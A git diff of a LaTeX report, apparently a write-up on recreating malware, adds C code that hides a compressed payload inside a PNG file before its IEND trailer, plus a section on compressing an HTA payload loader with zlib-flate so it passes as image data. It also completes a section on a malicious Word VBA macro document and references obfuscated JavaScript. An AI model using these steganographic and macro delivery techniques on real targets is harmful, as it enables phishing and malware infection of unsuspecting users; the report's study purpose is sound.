@@ -91,8 +91,14 @@ expects the target \acrshort{PNG} file as the first argument and the compressed 
 int hide_payload(FILE *image, FILE *executable) {
   unsigned long read, wrote;
   unsigned char buffer[8192];
+  unsigned char iend[] = {73, 69, 78, 68};
 
-  fseek(image, 0, SEEK_END);
+  // Overwrite the IEND PNG image trailer
+  fseek(image, -4, SEEK_END); 
+
+  // Skip the zlib header for the appended file -- appends to the
+  // existing zlib data
+  fseek(executable, 3, SEEK_SET);
   do {
     read = fread(buffer, 1, sizeof buffer, executable);
     wrote = fwrite(buffer, 1, read, image);
@@ -103,6 +109,8 @@ int hide_payload(FILE *image, FILE *executable) {
     }
   } while ((read > 0));
 
+  // Append the IEND image trailer behind the appended data
+  fwrite(iend, 1, 4, image); 
   return 1;
 }
 \end{lstlisting}
@@ -287,6 +295,21 @@ try {
 } catch (_0x1f5265) {}
 window[_0x556975(0x1e7)](); // window.close()
 \end{lstlisting}
+
+\subsection{Compressing the Payload Loader}
+Since the payload loader is the final payload that needs to be attached to the image, we need to adequately prepare it
+for this task. In practice, this means compressing it in the same way the \acrshort{PNG} data is stored and masking it
+as part of the image. 
+
+To compress the data the same way as the \acrshort{PNG} data stream, we need to achieve the following compression
+signature using the \verb+binwalk+ utility: \verb+Zlib compressed data, default compression+. Standard compression tools
+we used often append additional headers that we don't want and we found the easiest and most straightforward utility to
+use to simply compress data using default Zlib compression to be \verb+zlib-flate+, which is part of the \verb+qpdf+
+package on Linux systems. This can be applied to the \acrshort{HTA} payload using the following command: 
+\verb+zlib-flate -compress < payload.hta > compressed_payload.zip+.
+
+The payload is now ready to be embedded within the \acrshort{PNG} image using the payload creation utilities described
+in section \ref{sec:impl-utilities}.
 
 
 \section{Microsoft Word Document - \acrshort{VBA} Payload} \label{sec:impl-macro}
@@ -474,18 +497,18 @@ Afterwards, open the \emph{Macros} menu by going to \emph{View > Macros} and cre
 editor, copy the macro source code from our GitHub repository, replacing all contents in the editor with the contents of
 the macro file. The malicious document is ready for use.
 
-%TODO: add
-%\begin{figure}[H]
-%  \centering
-%  \includegraphics[width=0.9\textwidth]{figures/malicious_document.png}
-%  \label{malicious_document}
-%  \caption{The malicious document, ready to be used}
-%\end{figure}
+\begin{figure}[H]
+  \centering
+  \includegraphics[width=0.9\textwidth]{figures/malicious_document.png}
+  \label{malicious_document}
+  \caption{The malicious document, ready to be used}
+\end{figure}
 
 
 % --------------------------------------------------
 % Notes
 % --------------------------------------------------
+\clearpage
 \begin{itemize}
   \item explain how you engineered your tool/technique
   \item focus on the interesting bits here, you do not have to explain all your code
@@ -501,4 +524,4 @@ How I recreated the malware
   \item Obfuscation
   \item Phishing document creation
 \end{itemize}
-
+\clearpage
